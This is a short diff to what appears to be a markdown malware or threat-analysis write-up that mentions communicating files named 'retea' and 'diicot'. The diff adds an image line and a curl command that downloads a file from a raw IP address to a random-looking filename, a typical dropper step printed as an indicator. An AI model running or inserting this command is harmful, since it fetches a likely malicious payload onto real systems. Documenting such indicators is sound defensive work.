@@ -954,3 +954,5 @@ among communicating files: retea & diicot
 
 <img width="1264" height="644" alt="image" src="https://github.com/user-attachments/assets/a1ddd61f-0cfc-4b63-86ef-744a87475176" />
 
+
+curl http://23.160.56.194/r.txt -o sdf3fslsdf15
